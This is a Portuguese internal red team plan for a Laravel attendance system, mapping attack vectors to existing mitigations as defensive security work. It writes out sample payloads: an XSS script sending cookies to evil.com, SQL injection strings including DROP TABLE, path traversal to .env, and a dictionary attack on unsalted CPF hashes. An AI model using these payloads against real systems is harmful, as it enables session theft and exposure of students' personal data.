Red Team Plan — Smart Attendance
Classificação: Uso interno / Fins educativos
Escopo: Análise ofensiva do sistema para identificação de superfícies de ataque
Regra: Somente planejamento — nenhum exploit real é executado

🎯 Objetivo do Atacante
Obter dados de alunos (Nome, RA, CPF), assumir controle de conta Master, injetar presenças falsas ou corromper notas.

1. RECONHECIMENTO (Information Gathering)
1.1 Enumeração de Rotas
Técnica: Acessar URLs comuns (/api, /admin, /debug, /phpinfo, 
/.env
, /storage)
Alvo: Verificar se APP_DEBUG=true expõe stack traces com caminhos e variáveis de ambiente
Risco detectado: Se rodar php artisan serve com debug ativo, cada erro 500 mostra o código-fonte completo na tela
Mitigação existente: ✅ Página 404 customizada não revela estrutura interna
1.2 Fingerprinting da Stack
Técnica: Analisar headers de resposta HTTP em busca de X-Powered-By: PHP, versão do Laravel, etc.
Descoberta potencial: Cabeçalho Server: Caddy/nginx + X-Powered-By: PHP/8.4 revela a stack completa
Mitigação existente: ✅ SecurityHeaders middleware remove headers sensíveis
1.3 Enumeração de Usuários
Técnica: Tentar login com e-mails conhecidos e medir a diferença de tempo de resposta
Risco: Se o sistema responde mais rápido para e-mails inexistentes (sem busca no BD) do que para os que existem (com hash), é possível confirmar se um e-mail está cadastrado
Mitigação existente: ✅ Mensagem de erro genérica ("Credenciais inválidas") — sem distinção entre "usuário não existe" e "senha errada"
2. ATAQUE À AUTENTICAÇÃO
2.1 Força Bruta no Login
Técnica: Ferramentas como Hydra ou Burp Suite Intruder com lista de senhas comuns (123456, password, senha123)
Alvo: /login/aluno e /login/professor
Risco: Contas com senhas fracas criadas pelo seeder
Mitigação existente: ✅ throttle:10,3 bloqueia após 10 tentativas em 3 minutos
2.2 Credential Stuffing
Técnica: Usar listas de credenciais vazadas de outros serviços (e-mail + senha de outro site)
Risco real: Alunos que reutilizam a mesma senha em vários serviços
Mitigação existente: ✅ Senhas bcrypt no banco. ⚠️ Sem 2FA implementado
2.3 Session Fixation / Hijacking
Técnica: Capturar cookie de sessão via rede não-criptografada (HTTP) ou XSS
Risco: Sem HTTPS, a sessão viaja em texto puro entre o browser e o servidor
Mitigação existente: ⚠️ Sem HTTPS configurado em dev. Em produção, HTTPS é mandatório
Vetor adicional: Se XSS existir, o atacante pode roubar o cookie de sessão via document.cookie
3. INJEÇÃO DE DADOS (Injection Attacks)
3.1 SQL Injection
Técnica: Inserir '; DROP TABLE alunos; -- ou ' OR 1=1 -- em campos de login
Alvo: Campos cpf_email e ra_email_cpf
Mitigação existente: ✅ Eloquent ORM usa PDO com queries preparadas — SQL injection impossível via Eloquent
Risco residual: Verificar se há DB::statement() ou DB::unprepared() em algum lugar — não foi encontrado na auditoria
3.2 Column Injection (Corrigido)
Técnica (pré-fix): Enviar {"campo": "aluno_id", "valor": 999} via POST para POST /professor/gerenciar/{id}/notas
Efeito: Sobrescreveria o ID do aluno no registro — vinculando notas a outro aluno
Mitigação existente: ✅ Allowlist explícita com in_array($campo, $allowedFields, true) corrigiu isso
3.3 Mass Assignment
Técnica: Enviar campos não esperados no corpo de uma requisição (role=master, id=1)
Mitigação existente: ✅ $fillable explícito em todos os models — campos não declarados são ignorados automaticamente
3.4 XSS Armazenado (Stored XSS)
Técnica: Salvar <script>document.location='https://evil.com/steal?c='+document.cookie</script> como nome de um aluno ou matéria
Vetor de ataque: Se o campo nome for exibido sem sanitização em outro lugar do sistema
Mitigação existente: ✅ Todas as views usam {{ $variavel }} (escaping automático do Blade)
Risco residual: ⚠️ {!! $variavel !!} em alguma view desabilitaria o escaping — auditar views que usam essa sintaxe
3.5 Path Traversal
Técnica: Tentar acessar /../../../.env ou /../../../config/database.php via parâmetros de URL
Alvo: Qualquer endpoint que aceite um nome de arquivo como parâmetro
Mitigação existente: ✅ Nenhum endpoint aceita path de arquivo diretamente no sistema atual
4. ATAQUE AOS DADOS CRIPTOGRAFADOS
4.1 Roubo da APP_KEY
Técnica: Acessar o arquivo .env via misconfiguration de servidor web, exposição via git ou acesso ao servidor
Efeito: Com a APP_KEY, todos os dados criptografados no banco podem ser descriptografados
Mitigação existente: ✅ .env no .gitignore. ⚠️ Se a key vazar, todos os dados estão comprometidos — não há segunda linha de defesa
Recomendação: Rotacionar a APP_KEY periodicamente e usar serviços de secrets management (ex: AWS Secrets Manager)
4.2 Ataque de Dicionário no Blind Index
Técnica: Gerar SHA-256 de CPFs comuns (000.000.000-00 a 999.999.999-99) e comparar com os cpf_search no banco
Efeito: Como CPF tem espaço de busca finito (~100M combinações), é viável em hardware dedicado
Risco: Quem tem acesso ao banco pode offline-bruteforce os Blind Indexes
Mitigação existente: ⚠️ Sem salt no Blind Index — hashes são determinísticos globalmente. Adicionar HMAC com APP_KEY como chave aumentaria a resiliência
Recomendação futura: Usar hash_hmac('sha256', $value, config('app.key')) no generateBlindIndex()
4.3 Timing Attack no Login
Técnica: Medir o tempo de resposta de cada tentativa de login para inferir se o hash de Blind Index "deu match" antes de verificar a senha
Risco baixo: As operações são rápidas o suficiente que variações de rede mascaram a diferença
Mitigação existente: ✅ Hash::check() usa comparação de tempo constante
5. ATAQUE À AUTORIZAÇÃO (Privilege Escalation)
5.1 IDOR — Insecure Direct Object Reference
Técnica: Um professor logado acessa /professor/gerenciar/999 tentando gerenciar matéria de outro professor
Mitigação existente: ✅ $professor->materias()->where('materias.id', $materia_id)->first() — verifica se a matéria pertence ao professor autenticado
5.2 Guard Bypass
Técnica: Tentar acessar /dashboard/master/alunos sem autenticação Master (só com sessão de professor ativa)
Mitigação existente: ✅ Middleware auth:masters separado — sessão de professor não satisfaz o guard masters
5.3 Role Tampering
Técnica: Modificar o cookie de sessão para alterar a role do usuário
Mitigação existente: ✅ Sessão armazenada no servidor (não no cookie). O cookie contém apenas um ID de sessão opaco. Alterar o cookie invalida a sessão
6. ATAQUE À DISPONIBILIDADE (DoS)
6.1 Seeder / Geração de Hashes em Massa
Técnica: Criar scripts que enviem milhares de requisições de registro simultâneas
Risco: O processo de geração de Blind Indexes (SHA-256) + criptografia (AES-256) é CPU-intensivo — o servidor pode ser sobrecarregado
Mitigação existente: ✅ Throttle no login. ⚠️ Sem throttle no endpoint de check-in de presença via QR (apenas 10/min)
6.2 Enumeração de QR Codes
Técnica: Tentar acessar /presenca/confirmar/{codigo} com códigos aleatórios em bulk
Risco: Registrar presença falsa sem estar na aula
Mitigação existente: ✅ O código é gerado com Str::random() e expira com o cache. ⚠️ Sem validação de que o aluno está matriculado na matéria do QR code
7. RESUMO DE PRIORIDADES PARA DEFESA
Vetor	Severidade	Status
Roubo da APP_KEY	🔴 Crítico	⚠️ Ponto único de falha
Força bruta no login	🟠 Alto	✅ Mitigado (throttle)
Column Injection	🟠 Alto	✅ Corrigido
Blind Index sem HMAC	🟡 Médio	⚠️ Melhoria futura
XSS via {!! !!}	🟡 Médio	✅ Não encontrado nas views
IDOR em matérias	🟡 Médio	✅ Mitigado
QR Code sem validação de matrícula	🟡 Médio	⚠️ A verificar
Sessão sem HTTPS	🟠 Alto	⚠️ Só seguro em produção com HTTPS
Sem 2FA	🟡 Médio	⚠️ Melhoria futura
Rate Limit nas buscas Master	🟢 Baixo	✅ throttle:30,1 adicionado
CAUTION

Este documento é para uso educacional e interno. As informações aqui contidas descrevem vetores de ataque teóricos contra o Smart Attendance com o objetivo exclusivo de identificar pontos de melhoria na segurança do sistema.